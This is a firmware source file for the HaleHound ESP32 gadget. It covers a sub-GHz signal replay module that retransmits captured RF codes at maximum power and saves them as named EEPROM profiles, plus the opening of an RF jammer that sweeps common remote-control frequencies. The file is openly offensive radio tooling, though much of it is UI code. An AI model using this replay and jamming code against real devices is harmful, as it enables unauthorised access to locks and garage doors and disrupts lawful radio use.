    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.printf("val=%lu p%d %dbit", value, protocol, bitLength);

    // Pause RMT RX — TX needs GDO0 as output
    pauseRmtRx();
    delay(20);

    // Acquire CC1101 mutex — FFT task will just wait, no need to kill it
    bool gotLock = cc1101Lock(pdMS_TO_TICKS(300));
    Serial.printf("[SUBGHZ-TX] Lock: %s\n", gotLock ? "OK" : "FAIL");

    if (!gotLock) {
        tft.setCursor(10, CAPTURE_PANEL_Y + 30);
        tft.setTextColor(0xF800);
        tft.print("LOCK FAILED!");
        delay(500);
        transmitting = false;
        resumeRmtRx();
        updateDisplay();
        return;
    }

    // Switch CC1101 to TX mode at max power
    ELECHOUSE_cc1101.setPA(12);
    cc1101PaSetTx();
    delay(5);  // Let PA settle after RX→TX switch

    Serial.printf("[SUBGHZ-TX] TX mode set, PA=12, GDO0=GPIO%d\n", CC1101_GDO0);

    // Try RMT first (hardware-timed OOK, ~100ns jitter)
    bool success = sendSignalRMT(value, bitLength, protocol, 10);
    Serial.printf("[SUBGHZ-TX] RMT: %s\n", success ? "OK" : "FAIL");

    // Fallback to RCSwitch if RMT fails
    if (!success) {
        Serial.println("[SUBGHZ-TX] RCSwitch fallback");
        tft.setCursor(10, CAPTURE_PANEL_Y + 40);
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.print("(RCSwitch fallback)");
        rcSwitch.enableTransmit(CC1101_GDO0);
        rcSwitch.setProtocol(protocol);
        rcSwitch.send(value, bitLength);
        rcSwitch.disableTransmit();
    }

    // Switch back to RX (still holding lock)
    cc1101PaSetRx();
    cc1101Unlock();

    tft.fillRect(0, CAPTURE_PANEL_Y, SCREEN_WIDTH, CAPTURE_PANEL_H, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_GREEN);
    tft.setCursor(10, CAPTURE_PANEL_Y + 15);
    tft.print("TX COMPLETE");
    delay(600);

    // Restore receive chain + full screen rebuild
    transmitting = false;
    resumeRmtRx();

    drawHeaderStatic();
    updateDisplay();
    if (signalCaptured) drawSignalCaptured();

    Serial.println("[SUBGHZ-TX] DONE");
}

bool sendSignalRMT(unsigned long value, int bitLength, int protocol, int repetitions) {
    if (!rmtInitialized) {
        if (!initRMT()) {
            return false;
        }
    }

    int numSymbols = buildRMTSymbols(protocol, value, bitLength);
    if (numSymbols == 0) {
        return false;
    }

    #if CYD_DEBUG
    Serial.println("[RMT] Sending: proto=" + String(protocol) +
                  ", val=" + String(value) +
                  ", bits=" + String(bitLength) +
                  ", reps=" + String(repetitions));
    #endif

    for (int rep = 0; rep < repetitions; rep++) {
        rmtTransmit(rmtSymbols, numSymbols);
        yield();
    }

    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROFILE MENU UI
// ═══════════════════════════════════════════════════════════════════════════

static void drawProfileMenu() {
    tft.fillScreen(HALEHOUND_BLACK);

    // Title bar
    tft.fillRect(0, 0, SCREEN_WIDTH, SCALE_Y(28), HALEHOUND_DARK);
    tft.drawLine(0, SCALE_Y(28), SCREEN_WIDTH, SCALE_Y(28), HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int titleX = (SCREEN_WIDTH - (15 * 6)) / 2;  // "SIGNAL PROFILES" centered
    tft.setCursor(titleX, SCALE_Y(10));
    tft.print("SIGNAL PROFILES");

    // SAVE button (only if signal captured and room available)
    int saveY = SCALE_Y(40);
    if (signalCaptured && profileCount < MAX_PROFILES) {
        tft.fillRoundRect(SCALE_X(20), saveY, CONTENT_INNER_W, SCALE_H(22), 4, HALEHOUND_HOTPINK);
        tft.setTextColor(HALEHOUND_BLACK);
        int saveTextX = (SCREEN_WIDTH - (19 * 6)) / 2;  // "SAVE CURRENT SIGNAL"
        tft.setCursor(saveTextX, saveY + SCALE_Y(6));
        tft.print("SAVE CURRENT SIGNAL");
    } else if (!signalCaptured) {
        tft.setTextColor(HALEHOUND_VIOLET);
        tft.setCursor(SCALE_X(15), saveY + SCALE_Y(4));
        if (initialized) {
            tft.print("Capture a signal first");
        } else {
            tft.print("Use floppy icon in Replay");
        }
    } else {
        // profileCount >= MAX_PROFILES
        tft.setTextColor(0xF800);
        tft.setCursor(SCALE_X(30), saveY + SCALE_Y(4));
        tft.print("All slots full - delete one");
    }

    // Profile slots
    int slotStartY = SCALE_Y(75);
    int slotH = SCALE_H(25);

    for (int i = 0; i < MAX_PROFILES; i++) {
        int rowY = slotStartY + (i * slotH);

        if (i < profileCount) {
            SignalProfile* p = getProfile(i);
            if (p) {
                // Slot number + name
                tft.setTextColor(HALEHOUND_BRIGHT);
                tft.setCursor(SCALE_X(15), rowY + 4);
                tft.print(i + 1);
                tft.print(". ");
                tft.setTextColor(HALEHOUND_CYAN);
                tft.print(p->name);

                // [RAW] tag for raw captures
                if (p->isRaw) {
                    tft.setTextColor(HALEHOUND_HOTPINK);
                    tft.print(" RAW");
                }

                // Frequency
                tft.setTextColor(HALEHOUND_MAGENTA);
                tft.print(" ");
                tft.print(p->frequency / 1000000.0, 2);

                // Delete [X] button — red square at right edge
                int delX = SCREEN_WIDTH - SCALE_X(25);
                tft.fillRect(delX, rowY, SCALE_W(18), SCALE_H(18), 0xF800);
                tft.setTextColor(HALEHOUND_BLACK);
                tft.setCursor(delX + SCALE_X(4), rowY + 4);
                tft.print("X");
            }
        } else {
            // Empty slot
            tft.setTextColor(0x4208);  // Dim grey
            tft.setCursor(SCALE_X(15), rowY + 4);
            tft.print(i + 1);
            tft.print(". (empty)");
        }
    }

    // Profile count
    tft.setTextColor(HALEHOUND_VIOLET);
    char countBuf[12];
    snprintf(countBuf, sizeof(countBuf), "%d/%d saved", profileCount, MAX_PROFILES);
    int countX = (SCREEN_WIDTH - (strlen(countBuf) * 6)) / 2;
    tft.setCursor(countX, SCALE_Y(185));
    tft.print(countBuf);

    // Debug state line — shows why SAVE button may be hidden
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(10, SCALE_Y(200));
    tft.printf("sig=%d cnt=%d addr=%d", (int)signalCaptured, profileCount, EEPROM_PROFILE_COUNT_ADDR);
    if (signalCaptured) {
        tft.setCursor(10, SCALE_Y(215));
        tft.printf("val=%lu p%d %dbit", capturedValue, capturedProtocol, capturedBitLength);
    }

    // BACK button
    int backY = SCALE_Y(250);
    tft.drawRoundRect(SCALE_X(70), backY, SCALE_W(100), SCALE_H(25), 4, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    int backTextX = (SCREEN_WIDTH - (8 * 6)) / 2;  // "[ BACK ]"
    tft.setCursor(backTextX, backY + SCALE_Y(7));
    tft.print("[ BACK ]");
}

// ═══════════════════════════════════════════════════════════════════════════
// CUSTOM NAMING KEYBOARD — On-screen QWERTY for profile names
// Same pattern as Captive Portal keyboard in wifi_attacks.cpp
// ═══════════════════════════════════════════════════════════════════════════

static void raKbPrintKeyLabel(char c) {
    if (c == RA_KB_SHIFT) {
        tft.print(kbMode == 0 ? "^" : kbMode == 1 ? "#" : "ab");
    } else if (c == RA_KB_SPACE) {
        tft.print("_");
    } else if (c == RA_KB_BKSP) {
        tft.print("<");
    } else {
        tft.print(c);
    }
}

static void drawKbInputField() {
    int boxX = SCALE_X(10);
    int boxY = SCALE_Y(55);
    int boxW = CONTENT_INNER_W;
    int boxH = SCALE_H(18);

    tft.fillRect(boxX + 2, boxY + 2, boxW - 4, boxH - 4, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.setTextSize(1);
    tft.setCursor(boxX + 6, boxY + 5);
    tft.print(kbInputBuf);

    // Blinking cursor
    if (kbCursorState && kbInputLen < 15) {
        int cursorX = boxX + 6 + (kbInputLen * 6);
        tft.fillRect(cursorX, boxY + 4, 5, boxH - 8, HALEHOUND_HOTPINK);
    }
}

static void drawNameKeyboard() {
    // Clear content area
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, HALEHOUND_BLACK);

    // Title
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setTextSize(1);
    tft.setCursor(SCALE_X(40), SCALE_Y(42));
    tft.print("NAME YOUR SIGNAL");

    // Input box
    int boxX = SCALE_X(10);
    int boxY = SCALE_Y(55);
    int boxW = CONTENT_INNER_W;
    int boxH = SCALE_H(18);
    tft.drawRect(boxX, boxY, boxW, boxH, HALEHOUND_MAGENTA);
    tft.drawRect(boxX + 1, boxY + 1, boxW - 2, boxH - 2, HALEHOUND_GUNMETAL);
    drawKbInputField();

    // Keyboard keys — 4 rows
    int yOffset = SCALE_Y(85);
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(raKbLayout[row]); col++) {
            tft.fillRect(xOffset, yOffset, raKbKeyW, raKbKeyH, HALEHOUND_DARK);
            tft.drawRect(xOffset, yOffset, raKbKeyW, raKbKeyH, HALEHOUND_GUNMETAL);
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setTextSize(1);
            tft.setCursor(xOffset + raKbKeyW / 3, yOffset + raKbKeyH / 4);
            raKbPrintKeyLabel(raKbLayout[row][col]);
            xOffset += raKbKeyW + raKbKeySp;
        }
        yOffset += raKbKeyH + raKbKeySp;
    }

    // CANCEL and OK buttons
    int btnW = SCALE_W(80);
    int btnH = SCALE_H(22);
    int btnY = SCALE_Y(170);

    // CANCEL
    tft.fillRoundRect(SCALE_X(15), btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(SCALE_X(15), btnY, btnW, btnH, 3, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(SCALE_X(25), btnY + btnH / 3);
    tft.print("CANCEL");

    // OK
    int okX = SCALE_X(145);
    tft.fillRoundRect(okX, btnY, btnW, btnH, 3, HALEHOUND_DARK);
    tft.drawRoundRect(okX, btnY, btnW, btnH, 3, HALEHOUND_MAGENTA);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(okX + SCALE_W(30), btnY + btnH / 3);
    tft.print("OK");

    // Help text
    tft.setTextColor(HALEHOUND_GUNMETAL);
    tft.setTextSize(1);
    tft.setCursor(5, SCALE_Y(198));
    tft.print("^ Mode  _ Space  < Bksp");
}

static bool handleNameKeyboard(int x, int y) {
    // Check keyboard keys
    int yOffset = SCALE_Y(85);
    for (int row = 0; row < 4; row++) {
        int xOffset = 5;
        for (int col = 0; col < (int)strlen(raKbLayout[row]); col++) {
            if (x >= xOffset && x <= xOffset + raKbKeyW &&
                y >= yOffset && y <= yOffset + raKbKeyH) {
                char c = raKbLayout[row][col];

                // Visual feedback — flash key HOTPINK
                tft.fillRect(xOffset, yOffset, raKbKeyW, raKbKeyH, HALEHOUND_HOTPINK);
                tft.setTextColor(HALEHOUND_BLACK);
                tft.setCursor(xOffset + raKbKeyW / 3, yOffset + raKbKeyH / 4);
                raKbPrintKeyLabel(c);
                delay(80);
                tft.fillRect(xOffset, yOffset, raKbKeyW, raKbKeyH, HALEHOUND_DARK);
                tft.drawRect(xOffset, yOffset, raKbKeyW, raKbKeyH, HALEHOUND_GUNMETAL);
                tft.setTextColor(HALEHOUND_MAGENTA);
                tft.setCursor(xOffset + raKbKeyW / 3, yOffset + raKbKeyH / 4);
                raKbPrintKeyLabel(c);

                if (c == RA_KB_BKSP) {
                    if (kbInputLen > 0) {
                        kbInputLen--;
                        kbInputBuf[kbInputLen] = '\0';
                    }
                } else if (c == RA_KB_SHIFT) {
                    kbMode = (kbMode + 1) % 3;
                    raKbLayout = (kbMode == 0) ? raKbLower :
                                 (kbMode == 1) ? raKbUpper : raKbSymbols;
                    drawNameKeyboard();
                    return false;  // Not done yet
                } else if (c == RA_KB_SPACE) {
                    if (kbInputLen < 15) {
                        kbInputBuf[kbInputLen++] = ' ';
                        kbInputBuf[kbInputLen] = '\0';
                    }
                } else {
                    if (kbInputLen < 15) {
                        kbInputBuf[kbInputLen++] = c;
                        kbInputBuf[kbInputLen] = '\0';
                    }
                }
                drawKbInputField();
                return false;  // Not done yet
            }
            xOffset += raKbKeyW + raKbKeySp;
        }
        yOffset += raKbKeyH + raKbKeySp;
    }

    // Check buttons
    int btnW = SCALE_W(80);
    int btnH = SCALE_H(22);
    int btnY = SCALE_Y(170);

    // CANCEL
    if (x >= SCALE_X(15) && x <= SCALE_X(15) + btnW &&
        y >= btnY && y <= btnY + btnH + 3) {
        kbActive = false;
        kbInputLen = 0;
        kbInputBuf[0] = '\0';
        return true;  // Done — cancelled (empty buffer)
    }

    // OK
    int okX = SCALE_X(145);
    if (x >= okX && x <= okX + btnW &&
        y >= btnY && y <= btnY + btnH + 3) {
        if (kbInputLen > 0) {
            kbActive = false;
            return true;  // Done — name in kbInputBuf
        }
    }

    return false;  // Not done yet
}

// Blocking keyboard entry — returns true if user pressed OK (name in outputName)
static bool showNameKeyboard(char* outputName, int maxLen) {
    kbActive = true;
    kbMode = 0;
    raKbLayout = raKbLower;
    kbInputLen = 0;
    kbInputBuf[0] = '\0';
    kbCursorState = true;
    kbLastCursorToggle = millis();

    drawNameKeyboard();
    waitForTouchRelease();

    unsigned long lastTap = millis();

    while (kbActive) {
        // Cursor blink
        if (millis() - kbLastCursorToggle > 500) {
            kbCursorState = !kbCursorState;
            kbLastCursorToggle = millis();
            drawKbInputField();
        }

        // Touch input
        if (millis() - lastTap >= 200) {
            uint16_t tx, ty;
            if (getTouchPoint(&tx, &ty)) {
                lastTap = millis();
                if (handleNameKeyboard(tx, ty)) {
                    break;  // Done
                }
            }
        }

        // Hardware buttons
        touchButtonsUpdate();
        if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            kbActive = false;
            kbInputLen = 0;
            kbInputBuf[0] = '\0';
            break;
        }

        delay(10);
    }

    // If user typed something, copy to output
    if (kbInputLen > 0) {
        int copyLen = kbInputLen < maxLen ? kbInputLen : maxLen;
        memcpy(outputName, kbInputBuf, copyLen);
        outputName[copyLen] = '\0';
        return true;
    }

    return false;  // Cancelled
}

void showProfileMenu() {
    // Refresh profile count from EEPROM (works whether replay module is initialized or not)
    EEPROM.begin(EEPROM_SIZE);
    int stored = EEPROM.read(EEPROM_PROFILE_COUNT_ADDR);
    if (stored >= 0 && stored <= MAX_PROFILES) profileCount = stored;
    else profileCount = 0;
    EEPROM.end();

    drawProfileMenu();

    // Wait for finger to fully lift from the icon bar tap that opened this menu.
    // The floppy icon (X=280 on 3.5") is inside the BTN_BACK zone (X213-320 Y0-80).
    // Without this wait, lifting the finger triggers BTN_BACK → menu immediately exits.
    waitForTouchRelease();

    // Clear any stale button state left over
    touchButtonsUpdate();
    buttonPressed(BTN_BACK);
    buttonPressed(BTN_BOOT);

    unsigned long lastTap = millis();

    while (true) {
        // Check for touch FIRST — before touchButtonsUpdate() to avoid BTN_BACK
        // zone overlap with SAVE button region on 3.5" CYD
        uint16_t tx, ty;
        bool touched = false;

        if (millis() - lastTap >= 250) {
            if (getTouchPoint(&tx, &ty)) {
                touched = true;
                lastTap = millis();

                // Show touch coordinates for debugging
                tft.fillRect(0, SCALE_Y(230), SCREEN_WIDTH, SCALE_H(15), HALEHOUND_BLACK);
                tft.setTextColor(HALEHOUND_VIOLET);
                tft.setCursor(10, SCALE_Y(232));
                tft.printf("touch: x=%d y=%d", tx, ty);
                Serial.printf("[PROFILE-TOUCH] x=%d y=%d\n", tx, ty);

                // SAVE button region
                int saveY = SCALE_Y(40);
                int saveEndY = saveY + SCALE_H(22);
                int saveX1 = SCALE_X(20);
                int saveX2 = saveX1 + CONTENT_INNER_W;
                Serial.printf("[PROFILE-SAVE-CHECK] saveY=%d-%d saveX=%d-%d sig=%d cnt=%d\n",
                              saveY, saveEndY, saveX1, saveX2, (int)signalCaptured, profileCount);
                if (ty >= (uint16_t)saveY && ty <= (uint16_t)saveEndY &&
                    tx >= (uint16_t)saveX1 && tx <= (uint16_t)saveX2 &&
                    signalCaptured && profileCount < MAX_PROFILES) {
                    Serial.println("[PROFILE] SAVE HIT — opening keyboard");
                    char name[16];
                    bool named = showNameKeyboard(name, 15);
                    if (!named) {
                        // User cancelled — redraw profile menu
                        drawProfileMenu();
                        waitForTouchRelease();
                        lastTap = millis();
                        continue;
                    }
                    if (saveProfile(name)) {
                        drawProfileMenu();
                        tft.fillRect(SCALE_X(60), SCALE_Y(140), SCALE_W(120), SCALE_H(20), HALEHOUND_GREEN);
                        tft.setTextColor(HALEHOUND_BLACK);
                        tft.setCursor(SCALE_X(80), SCALE_Y(144));
                        tft.print("SAVED!");
                        delay(600);
                    } else {
                        drawProfileMenu();
                        tft.fillRect(SCALE_X(40), SCALE_Y(140), SCALE_W(160), SCALE_H(20), 0xF800);
                        tft.setTextColor(HALEHOUND_BLACK);
                        tft.setCursor(SCALE_X(50), SCALE_Y(144));
                        tft.print("SAVE FAILED!");
                        Serial.println("[PROFILE] saveProfile() RETURNED FALSE");
                        delay(600);
                    }
                    waitForTouchRelease();
                    drawProfileMenu();
                    continue;
                }

                // Profile slot regions
                int slotStartY = SCALE_Y(75);
                int slotH = SCALE_H(25);

                for (int i = 0; i < MAX_PROFILES; i++) {
                    int rowY = slotStartY + (i * slotH);
                    int rowEndY = rowY + slotH;

                    if (ty >= (uint16_t)rowY && ty < (uint16_t)rowEndY && i < profileCount) {
                        int delX = SCREEN_WIDTH - SCALE_X(30);
                        if (tx >= (uint16_t)delX) {
                            // DELETE
                            deleteProfile(i);
                            tft.fillRect(SCALE_X(55), SCALE_Y(140), SCALE_W(130), SCALE_H(20), 0xF800);
                            tft.setTextColor(HALEHOUND_BLACK);
                            tft.setCursor(SCALE_X(72), SCALE_Y(144));
                            tft.print("DELETED!");
                            delay(400);
                            waitForTouchRelease();
                            drawProfileMenu();
                        } else {
                            // LOAD — only safe if replay module has CC1101 initialized
                            if (initialized) {
                                loadProfile(i);
                                tft.fillRect(SCALE_X(55), SCALE_Y(140), SCALE_W(130), SCALE_H(20), HALEHOUND_CYAN);
                                tft.setTextColor(HALEHOUND_BLACK);
                                tft.setCursor(SCALE_X(74), SCALE_Y(144));
                                tft.print("LOADED!");
                                delay(400);
                                // Return to replay screen with signal active
                                tft.fillScreen(HALEHOUND_BLACK);
                                drawReplayUI();
                                drawUI();
                                updateDisplay();
                                drawSignalCaptured();
                                return;
                            } else {
                                tft.fillRect(SCALE_X(35), SCALE_Y(140), SCALE_W(170), SCALE_H(20), HALEHOUND_VIOLET);
                                tft.setTextColor(HALEHOUND_BLACK);
                                tft.setCursor(SCALE_X(40), SCALE_Y(144));
                                tft.print("USE SIGNAL REPLAY");
                                delay(600);
                                waitForTouchRelease();
                                drawProfileMenu();
                            }
                        }
                        break;
                    }
                }

                // BACK button region (on-screen)
                int backY = SCALE_Y(250);
                int backEndY = backY + SCALE_H(25);
                if (ty >= (uint16_t)backY && ty <= (uint16_t)backEndY &&
                    tx >= (uint16_t)SCALE_X(70) && tx <= (uint16_t)(SCALE_X(70) + SCALE_W(100))) {
                    break;
                }
            }
        }

        // Only run touchButtonsUpdate if no touch region was handled this frame
        if (!touched) {
            touchButtonsUpdate();
        }

        // Hardware BOOT button only — BTN_BACK zone overlaps menu elements on 3.5"
        if (buttonPressed(BTN_BOOT)) {
            break;
        }

        delay(10);
    }

    // Restore replay screen only if inside replay module
    if (initialized) {
        tft.fillScreen(HALEHOUND_BLACK);
        drawReplayUI();
        drawUI();
        updateDisplay();
        if (signalCaptured) {
            drawSignalCaptured();
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PROFILE MANAGEMENT
// ═══════════════════════════════════════════════════════════════════════════

bool saveProfile(const char* name) {
    if (profileCount >= MAX_PROFILES) {
        Serial.println("[SUBGHZ] Profile storage full");
        return false;
    }

    if (!signalCaptured) {
        Serial.println("[SUBGHZ] No signal to save");
        return false;
    }

    // Zero-init entire struct so raw items area is clean for protocol-decoded saves
    SignalProfile profile;
    memset(&profile, 0, sizeof(SignalProfile));

    profile.frequency = frequencyList[currentFreqIndex];
    strncpy(profile.name, name, 15);
    profile.name[15] = '\0';

    if (isRawCapture && rawCaptureLen > 0) {
        // RAW capture save — stores exact pulse timing
        profile.value = 0;
        profile.bitLength = rawCaptureLen;
        profile.protocol = 0;
        profile.isRaw = 1;
        int saveLen = (rawCaptureLen > MAX_RAW_ITEMS_PROFILE) ? MAX_RAW_ITEMS_PROFILE : rawCaptureLen;
        profile.rawItemCount = (uint16_t)saveLen;
        memcpy(profile.rawItems, rawCaptureItems, saveLen * sizeof(rmt_item32_t));

        Serial.printf("[SUBGHZ-SAVE] RAW '%s': %d items at %.3f MHz (addr %d)\n",
                      name, saveLen, profile.frequency / 1000000.0,
                      EEPROM_PROFILE_START + (profileCount * (int)sizeof(SignalProfile)));
    } else {
        // Protocol-decoded save
        profile.value = capturedValue;
        profile.bitLength = capturedBitLength;
        profile.protocol = capturedProtocol;
        profile.isRaw = 0;
        profile.rawItemCount = 0;

        Serial.printf("[SUBGHZ-SAVE] '%s': val=%lu bits=%d proto=%d freq=%.3f MHz\n",
                      name, profile.value, profile.bitLength, profile.protocol,
                      profile.frequency / 1000000.0);
    }

    int addr = EEPROM_PROFILE_START + (profileCount * sizeof(SignalProfile));
    Serial.printf("[SUBGHZ-SAVE] Writing %d bytes at EEPROM addr %d\n",
                  (int)sizeof(SignalProfile), addr);

    EEPROM.begin(EEPROM_SIZE);
    EEPROM.put(addr, profile);
    profileCount++;
    EEPROM.write(EEPROM_PROFILE_COUNT_ADDR, profileCount);
    EEPROM.commit();
    EEPROM.end();

    Serial.printf("[SUBGHZ-SAVE] Profile saved: '%s' (count now %d)\n", name, profileCount);
    return true;
}

bool loadProfile(int index) {
    if (index < 0 || index >= profileCount) {
        return false;
    }

    int addr = EEPROM_PROFILE_START + (index * sizeof(SignalProfile));

    SignalProfile profile;
    EEPROM.begin(EEPROM_SIZE);
    EEPROM.get(addr, profile);
    EEPROM.end();

    // Find matching frequency index
    for (int i = 0; i < frequencyCount; i++) {
        if (frequencyList[i] == profile.frequency) {
            currentFreqIndex = i;
            break;
        }
    }

    capturedValue = profile.value;
    capturedBitLength = profile.bitLength;
    capturedProtocol = profile.protocol;
    signalCaptured = true;

    if (profile.isRaw && profile.rawItemCount > 0) {
        // Raw profile — restore pulse timing to raw capture buffer
        isRawCapture = true;
        int loadLen = (profile.rawItemCount > RAW_CAPTURE_MAX) ? RAW_CAPTURE_MAX : profile.rawItemCount;
        memcpy(rawCaptureItems, profile.rawItems, loadLen * sizeof(rmt_item32_t));
        rawCaptureLen = loadLen;
        Serial.printf("[SUBGHZ] Raw profile loaded: '%s' (%d items)\n", profile.name, loadLen);
    } else {
        // Protocol-decoded profile
        isRawCapture = false;
        rawCaptureLen = 0;
        Serial.printf("[SUBGHZ] Profile loaded: '%s' val=%lu p%d\n",
                      profile.name, profile.value, profile.protocol);
    }

    // Tune to frequency
    cc1101PaSetIdle();
    ELECHOUSE_cc1101.setMHZ(profile.frequency / 1000000.0);
    cc1101PaSetRx();

    return true;
}

bool deleteProfile(int index) {
    if (index < 0 || index >= profileCount) {
        return false;
    }

    // Shift profiles down
    EEPROM.begin(EEPROM_SIZE);
    for (int i = index; i < profileCount - 1; i++) {
        SignalProfile profile;
        int srcAddr = EEPROM_PROFILE_START + ((i + 1) * sizeof(SignalProfile));
        int dstAddr = EEPROM_PROFILE_START + (i * sizeof(SignalProfile));
        EEPROM.get(srcAddr, profile);
        EEPROM.put(dstAddr, profile);
    }
    profileCount--;
    EEPROM.write(EEPROM_PROFILE_COUNT_ADDR, profileCount);
    EEPROM.commit();
    EEPROM.end();

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Profile deleted at index " + String(index));
    #endif

    return true;
}

int getProfileCount() {
    return profileCount;
}

SignalProfile* getProfile(int index) {
    static SignalProfile profile;
    if (index < 0 || index >= profileCount) {
        return nullptr;
    }

    int addr = EEPROM_PROFILE_START + (index * sizeof(SignalProfile));
    EEPROM.begin(EEPROM_SIZE);
    EEPROM.get(addr, profile);
    EEPROM.end();

    return &profile;
}

}  // namespace ReplayAttack


// ═══════════════════════════════════════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ JAMMER IMPLEMENTATION - WLAN Jammer Style UI
// Equalizer bars, skull row, gradient heat map
// ═══════════════════════════════════════════════════════════════════════════

namespace SubJammer {

// Frequency list (same as ReplayAttack)
static const float frequencyListMHz[] = {
    300.000, 303.875, 304.250, 310.000, 315.000, 318.000,
    390.000, 418.000, 433.075, 433.420, 433.920, 434.420,
    434.775, 438.900, 868.350, 915.000, 925.000
};
static const int frequencyCount = sizeof(frequencyListMHz) / sizeof(frequencyListMHz[0]);

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY CONSTANTS - INSANE EQUALIZER MODE (85 skinny bars!)
// Matches WLAN Jammer bar style exactly
// ═══════════════════════════════════════════════════════════════════════════
#define SJ_GRAPH_X 2
#define SJ_GRAPH_Y SCALE_Y(95)
#define SJ_GRAPH_WIDTH GRAPH_FULL_W
#define SJ_GRAPH_HEIGHT SCALE_Y(140)
#define SJ_NUM_BARS 85       // 85 skinny bars - same density as WLAN Jammer
// Each freq maps to a bar: barIdx = freqIndex * 85 / 17 = freqIndex * 5
#define SJ_FREQ_TO_BAR(f) ((f) * SJ_NUM_BARS / 17)

// Skull rows for jammer feedback - 3 rows of 8 = 24 skulls!
#define SJ_SKULL_Y SCALE_Y(250)
#define SJ_SKULL_ROWS 3
#define SJ_SKULL_ROW_SPACING SCALE_Y(18)
#define SJ_SKULL_NUM 8

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════
static bool initialized = false;
static bool exitRequested = false;
static volatile bool jamming = false;
static volatile bool continuousMode = true;   // true = carrier, false = noise
static volatile bool autoSweep = false;
static volatile int currentFreqIndex = 10;    // Default to 433.920 MHz
static volatile unsigned long lastSweepTime = 0;
static unsigned long lastDisplayTime = 0;
static volatile bool freqChanged = false;     // Core 1 sets, Core 0 reads

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE TASK MANAGEMENT
// Core 0: CC1101 TX engine (frequency sweep + jam signal)
// Core 1: Display + touch (Arduino main loop)
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t sjTaskHandle = NULL;
static volatile bool sjTaskRunning = false;

#define SWEEP_INTERVAL_MS 50

// Equalizer heat levels
static uint8_t channelHeat[SJ_NUM_BARS] = {0};
static int skullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ICONS
// ═══════════════════════════════════════════════════════════════════════════
static const unsigned char* sjSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 5 icons matching HaleHound style
// ═══════════════════════════════════════════════════════════════════════════
#define SJ_ICON_SIZE 16
#define SJ_ICON_NUM 6
// Layout: Back(10) | Toggle(60) | Prev(105) | Next(140) | Sweep(180) | Mode(215)
static int sjIconX[SJ_ICON_NUM] = {10, SCALE_X(60), SCALE_X(105), SCALE_X(140), SCALE_X(180), SCALE_X(215)};
static const unsigned char* sjIcons[SJ_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back
    bitmap_icon_start,             // 1: Toggle ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Prev freq
    bitmap_icon_sort_up_plus,      // 3: Next freq
    bitmap_icon_antenna,           // 4: Auto sweep toggle
    bitmap_icon_recycle            // 5: Toggle mode (Carrier/Noise)
};

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SJ_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        // Highlight start icon when jamming
        if (i == 1 && jamming) color = HALEHOUND_HOTPINK;
        // Highlight sweep icon when active
        if (i == 3 && autoSweep) color = HALEHOUND_HOTPINK;
        tft.drawBitmap(sjIconX[i], ICON_BAR_Y, sjIcons[i], SJ_ICON_SIZE, SJ_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void drawHeader() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCALE_Y(52), TFT_BLACK);

    // Title — Nosifer with glitch effect
    drawGlitchText(SCALE_Y(55), "SUBGHZ JAM", &Nosifer_Regular10pt7b);

    // Status
    if (jamming) {
        drawGlitchStatus(SCALE_Y(72), "JAMMING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(SCALE_Y(72), "STANDBY", HALEHOUND_GUNMETAL);
    }

    // Frequency info
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(70));
    if (autoSweep) {
        tft.print("Mode: SWEEP ALL (");
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.printf("%.3f", frequencyListMHz[currentFreqIndex]);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.print(" MHz)");
    } else {
        tft.printf("Freq: %.3f MHz", frequencyListMHz[currentFreqIndex]);
    }

    // Jam mode and sweep indicator
    tft.setCursor(10, SCALE_Y(82));
